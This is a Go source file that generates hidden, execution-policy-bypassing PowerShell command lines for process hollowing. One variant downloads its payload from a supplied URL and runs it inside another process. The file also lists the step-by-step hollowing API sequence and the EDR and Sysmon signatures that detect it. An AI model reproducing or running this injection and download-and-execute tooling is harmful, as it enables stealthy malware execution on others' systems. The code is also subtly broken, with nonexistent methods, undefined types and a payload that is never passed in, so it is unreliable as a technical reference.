package processinjection

import "fmt"

func InjectHollowing(targetProcess string, payload []byte) (string, error) {
	if targetProcess == "" {
		return "", fmt.Errorf("empty target process")
	}
	if len(payload) == 0 {
		return "", fmt.Errorf("empty payload")
	}
	_ = payload
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$si=New-Object System.Diagnostics.ProcessStartInfo; `+
			`$si.FileName='%s'; $si.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden; `+
			`$si.CreateNoWindow=$true; $si.UseShellExecute=$false; `+
			`$p=[System.Diagnostics.Process]::Start($si); `+
			`$p.Suspend(); $h=$p.Handle; `+
			`$pinfo=[System.Diagnostics.ProcessModule].GetConstructors()[0].Invoke($null); `+
			`$ntdll=[PoshWin32.Kernel32]::GetModuleHandle('ntdll'); `+
			`$unmap=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtUnmapViewOfSection'),`+
			`[Func[IntPtr,IntPtr,int]]); `+
			`$base=$pinfo.BaseAddress; $unmap.Invoke($h,$base); `+
			`$newBase=[PoshWin32.Kernel32]::VirtualAllocEx($h,$base,0x10000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$newBase,$payload,$payload.Length,[ref]0); `+
			`$ctx=New-Object PoshWin32.CONTEXT; $ctx.ContextFlags=0x100000; `+
			`$t=$p.Threads[0]; $th=[PoshWin32.Kernel32]::OpenThread(0x001F03FF,$false,$t.Id); `+
			`[PoshWin32.Kernel32]::GetThreadContext($th,[ref]$ctx); `+
			`$ctx.Rax=$newBase+0x1000; `+
			`[PoshWin32.Kernel32]::SetThreadContext($th,$ctx); `+
			`[PoshWin32.Kernel32]::ResumeThread($th)"`,
		targetProcess,
	), nil
}

func InjectHollowingFromURL(targetProcess string, payloadURL string) (string, error) {
	if targetProcess == "" {
		return "", fmt.Errorf("empty target process")
	}
	if payloadURL == "" {
		return "", fmt.Errorf("empty payload URL")
	}
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$wc=New-Object System.Net.WebClient; `+
			`$payloadBytes=$wc.DownloadData('%s'); `+
			`$si=New-Object System.Diagnostics.ProcessStartInfo; `+
			`$si.FileName='%s'; $si.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden; `+
			`$si.CreateNoWindow=$true; $si.UseShellExecute=$false; `+
			`$p=[System.Diagnostics.Process]::Start($si); $p.Suspend(); $h=$p.Handle; `+
			`$ntdll=[PoshWin32.Kernel32]::GetModuleHandle('ntdll'); `+
			`$unmap=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtUnmapViewOfSection'),`+
			`[Func[IntPtr,IntPtr,int]]); `+
			`$unmap.Invoke($h,$p.MainModule.BaseAddress); `+
			`$newBase=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x10000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$newBase,$payloadBytes,$payloadBytes.Length,[ref]0); `+
			`$ctx=New-Object PoshWin32.CONTEXT; $ctx.ContextFlags=0x100000; `+
			`$t=$p.Threads[0]; $th=[PoshWin32.Kernel32]::OpenThread(0x001F03FF,$false,$t.Id); `+
			`[PoshWin32.Kernel32]::GetThreadContext($th,[ref]$ctx); `+
			`$ctx.Rax=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x10000,0x3000,0x40)+0x1000; `+
			`[PoshWin32.Kernel32]::SetThreadContext($th,$ctx); `+
			`[PoshWin32.Kernel32]::ResumeThread($th)"`,
		payloadURL, targetProcess,
	), nil
}

func ProcessHollowingAPIMap() map[int]string {
	return map[int]string{
		1: "CreateProcess(targetPath, ..., CREATE_SUSPENDED, ..., &pi) -> suspended target process",
		2: "NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi) -> get PEB address",
		3: "ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress + ImageBaseAddress, &imageBase, 8, NULL) -> read original base",
		4: "NtUnmapViewOfSection(pi.hProcess, imageBase) -> unmap original executable image",
		5: "VirtualAllocEx(pi.hProcess, imageBase, payloadSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE) -> allocate at original base",
		6: "WriteProcessMemory(pi.hProcess, newBase, payload_headers, headersSize, NULL) -> write PE headers",
		7: "WriteProcessMemory(pi.hProcess, newBase + section.VirtualAddress, section.Data, section.Size, NULL) -> write PE sections",
		8: "SetThreadContext(pi.hThread, ctx {Rax = newBase + entryPoint}) -> set entry point to payload",
		9: "ResumeThread(pi.hThread) -> payload runs in hollowed process",
	}
}

func ProcessHollowingDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":     "CreateRemoteThread NOT triggered - no remote thread created",
		"Sysmon EventID 10":    "ProcessAccess detected for OpenProcess (NtOpenProcess)",
		"Sysmon EventID 11":    "FileCreate detected if payload written to disk",
		"Sysmon EventID 7":    "ImageLoad anomalies - original image not loaded, new memory-backed image runs",
		"EventID 4688":         "Process Creation with CREATE_SUSPENDED flag is suspicious",
		"EventID 4656":         "Handle to object - OpenProcess with PROCESS_ALL_ACCESS",
		"CrowdStrike Falcon":   "CS detects via process creation callbacks + NtUnmapViewOfSection kernel hook",
		"SentinelOne":          "S1 detects via process fork + memory write + context modification chain",
		"Microsoft Defender":   "MDE detects via ETW events for process hollowing: CREATE_SUSPENDED + NtUnmapViewOfSection + WriteProcessMemory + SetThreadContext + ResumeThread chain",
		"EventID 8004":         "WMI filter if WMI used for process creation",
	}
}
